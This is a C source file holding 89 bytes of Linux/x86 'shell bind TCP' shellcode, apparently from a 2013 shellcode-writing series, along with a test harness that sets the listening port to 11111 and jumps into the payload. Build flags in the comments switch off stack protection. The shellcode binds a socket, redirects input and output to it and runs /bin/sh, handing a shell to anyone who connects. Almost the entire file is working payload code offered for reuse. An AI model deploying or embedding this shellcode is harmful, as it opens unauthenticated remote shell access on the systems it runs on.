/*

 Shell Bind TCP (GetPC/Call/Ret Method) - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 shell_bind_tcp_getpc_shellcode

 * 89 bytes
 * null-bytes free
 * uses GetPC method for fun and profit


 # gcc -m32 -fno-stack-protector -z execstack shell_bind_tcp_getpc_shellcode.c -o shell_bind_tcp_getpc_shellcode
 # ./shell_bind_tcp_getpc_shellcode

 Testing
 # nc 127.0.0.1 11111

*/


#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\xe8\xff\xff\xff\xff\xc3\x5d\x8d\x6d\x4a\x31\xc0"
"\x99\x6a\x01\x5b\x52\x53\x6a\x02\xff\xd5\x96\x5b"
"\x52\x66\x68\x2b\x67\x66\x53\x89\xe1\x6a\x10\x51"
"\x56\xff\xd5\x43\x43\x52\x56\xff\xd5\x43\x52\x52"
"\x56\xff\xd5\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
"\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x52\x53\xeb\x04\x5f\x6a\x66\x58\x89"
"\xe1\xcd\x80\x57\xc3";

main ()
{

        // When the IP contains null-bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp");


	// Setting the port number (byte reverse order) and Calling the shellcode

	__asm__ ("movw $0x672b, (code+27)\n\t"
		"call code");

}